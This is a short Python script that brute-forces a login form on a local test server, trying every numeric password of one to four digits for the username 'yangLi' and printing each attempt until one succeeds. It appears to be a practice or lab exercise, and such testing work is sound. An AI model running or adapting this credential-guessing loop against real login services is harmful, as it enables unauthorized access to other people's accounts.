import requests
import itertools
import string

url = 'http://127.0.0.1:5000/login'

def attempt_login(username, password):
    data = {'username': username, 'password': password}
    response = requests.post(url, data=data)
    print(f"Attempted login with Username: {username}, Password: {password}, Content: {response.content}")
    if response.status_code == 200:
        if response.json().get('success'):
            print(f"Success! Username: {username}, Password: {password}")
            return True
    
    return False

username = "yangLi"
success = False  # Flag to indicate if the login was successful
# password = '100'
for password_length in range(1, 5):
    if success:
        break
    for password in itertools.product(string.digits, repeat=password_length):
        password_str = ''.join(password)
        if attempt_login(username, password_str):
            success = True  # Set the flag to True when login is successful
            break  # Exit the password loop
            #exit()

